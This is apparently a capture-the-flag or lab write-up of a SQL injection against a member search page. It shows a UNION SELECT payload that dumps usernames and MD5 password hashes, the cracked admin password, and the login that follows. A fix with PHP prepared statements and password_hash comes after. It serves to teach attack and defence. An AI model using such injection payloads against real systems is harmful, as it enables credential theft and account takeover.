# Sql Injection - Hash Function

Using an SQL injection we are able to list users credentials (`username`/`password`), and since password are hashed with MD5, we can reverse them.

## How-To

1. Go to `/?page=member`
1. Write in the search input

	```sql
	-- List Table Content
	1 UNION SELECT 1, CONCAT_WS(CHAR(47), username, password) FROM Member_Brute_Force.db_default

	-- First name: one, Surname : me
	-- First name: 1, Surname : root/3bf1114a986ba87ed28fc1b5884fc2f8
	-- First name: 1, Surname : admin/3bf1114a986ba87ed28fc1b5884fc2f8
	```

1. Reverse password

	```
	3bf1114a986ba87ed28fc1b5884fc2f8 = shadow
	```

1. Go to `?page=signin` and login

	- Username : admin
	- Password : shadow

## Fix

- Use a robust hash function to store password like `password_hash` in `PHP`.

	```php
	// Register
	$stmt = $db->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
	$stmt->bindParam(':username', $username, PDO::PARAM_STR);
	$stmt->bindParam(':password', password_hash($password, PASSWORD_BCRYPT), PDO::PARAM_STR);
	$stmt->execute();
	$stmt->closeCursor();

	// Login
	$stmt = $db->prepare("SELECT username, password FROM users WHERE username=:username");
	$stmt->bindParam(':username', $username, PDO::PARAM_STR);
	$stmt->execute();
	$user = $stmt->fetch();
	$stmt->closeCursor();

	if ( $user && password_verify($password, $user['password']) )
	{
		// Good
	}
	```

## Details

- Do NOT use MD5 for anything related to security

## Resources

- Decrypt : [MD5 Decrypt](https://md5decrypt.net/)
- PHP : [password_hash](https://www.php.net/manual/en/function.password-hash.php)
- PHP : [password_verify](https://www.php.net/manual/en/function.password-verify.php)
